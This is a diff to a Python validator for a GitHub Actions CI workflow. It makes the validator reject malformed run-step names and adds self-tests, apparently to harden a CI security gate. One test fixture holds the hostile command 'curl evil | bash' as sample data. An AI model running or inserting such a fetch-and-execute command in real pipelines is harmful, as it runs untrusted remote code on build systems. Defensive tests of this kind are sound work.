@@ -444,6 +444,22 @@ def require_known_run_steps(steps: list[dict], known_names, job_name: str) -> No
             )
 
 
+def validate_run_step_names(steps: list[dict], job_name: str) -> None:
+    """Reject malformed names before name-based workflow checks run."""
+
+    for step in steps:
+        if "run" not in step:
+            continue
+        name = step.get("name")
+        if name is None:
+            continue
+        if not isinstance(name, str) or not name.strip():
+            fail(
+                f".github/workflows/ci.yml jobs.{job_name} step name must be "
+                f"a non-empty string, got {name!r}"
+            )
+
+
 def validate_workflow(jobs=None) -> None:
     jobs = workflow_jobs() if jobs is None else jobs
 
@@ -482,6 +498,12 @@ def validate_workflow(jobs=None) -> None:
     security_steps = steps_by_job["security"]
     docker_steps = steps_by_job["docker-build"]
     all_steps = [step for steps in steps_by_job.values() for step in steps]
+
+    # Validate run-step names before the duplicate-name Counter and the
+    # known-step membership checks below. A YAML list or mapping in `name:` is
+    # otherwise unhashable and crashes the validator instead of failing closed.
+    for job_name, steps in steps_by_job.items():
+        validate_run_step_names(steps, job_name)
 
     # step_by_name()/step_run() only ever inspect the FIRST step matching a
     # given name. Without this check, a second step reusing an existing gate's
@@ -2128,6 +2150,18 @@ def run_self_test() -> None:
             ),
             "unnamed step",
         )
+        for malformed_name in ([], {}):
+            expect_fail_matching(
+                f"workflow malformed run step name {type(malformed_name).__name__}",
+                lambda malformed_name=malformed_name: validate_workflow(
+                    workflow_with(
+                        "security",
+                        lambda steps: steps
+                        + [{"name": malformed_name, "run": "curl evil | bash"}],
+                    )
+                ),
+                "step name must be a non-empty string",
+            )
         # PyYAML types `run: on` as True; GitHub Actions still runs it, so an
         # isinstance(str) gate would skip every check for that step.
         expect_fail(
